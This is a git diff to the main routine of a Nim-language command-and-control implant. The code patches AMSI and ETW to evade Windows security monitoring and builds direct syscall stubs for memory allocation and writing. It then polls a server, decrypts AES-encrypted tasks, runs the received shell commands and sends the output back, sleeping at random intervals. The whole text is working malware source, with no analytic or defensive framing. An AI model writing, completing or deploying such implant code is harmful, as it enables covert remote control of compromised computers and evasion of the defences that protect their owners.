@@ -1,10 +1,16 @@
 import os, json, strformat
 import utils, comms, config, syscalls
+import crypto
+import std/random
+import std/times
+
 proc main() =
-    discard PatchAMSI()
+    PatchAMSI()
     echo "ASMI done!"
-    discard PathETW()
+    PathETW()
     echo "ETW done!"
+
+    let AGENT_ID = genID()
 
     makeNtAllocateVirtualMemory()
     makeNtWriteVirtualMemory()
@@ -22,10 +28,9 @@ proc main() =
         let response = sendCheckin(AGENT_ID) #response of the post request made to endpoint , contains (task_id,cmd)
 
         if response.len > 0:
-            let rawtask = decryptJson(response,AES_KEY)
-            let parsedtask = parseTask(rawtask)
-            let output = execProcess(parsedtask.command)
-            discard sendTaskResult(agentID,parsedtask.task_id,parsedtask.command,output)
+            let rawtask = decryptJson(parseJson(response),AES_KEY)
+            let output = execProcess(rawtask["command"].getStr())
+            discard sendTaskResult(AGENT_ID,rawtask["task_id"].getStr(),rawtask["command"].getStr(),output)
         randomSleep(SLEEP_MIN, SLEEP_MAX)      
 when isMainModule:
   main()
